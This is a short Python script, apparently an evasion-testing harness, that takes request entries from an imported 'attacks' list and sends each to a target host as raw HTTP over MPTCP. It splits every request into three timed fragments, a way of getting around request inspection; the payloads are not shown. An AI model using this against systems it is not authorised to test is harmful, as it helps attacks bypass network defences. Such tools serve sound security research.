import socket
import sys
import time

sys.path.append("../")

from attacks import attacks

for request in attacks:
    payload = f"{request[1]} {request[0]} HTTP/1.1\r\nHost: {sys.argv[1]}\r\n{request[2]}\r\n\r\n{request[3]}\r\n".encode()

    length = len(request[0] + request[1])
    offset = int(length / 3)
    req1 = payload[:offset]
    req2 = payload[offset : offset * 2]
    req3 = payload[offset * 2 :]

    sock = socket.socket(
        socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_MPTCP
    )
    sock.connect((sys.argv[1], 80))

    sock.send(req1)

    time.sleep(0.2)

    sock.send(req2)

    time.sleep(0.2)

    sock.send(req3)

    sock.recv(2048)

    sock.close()
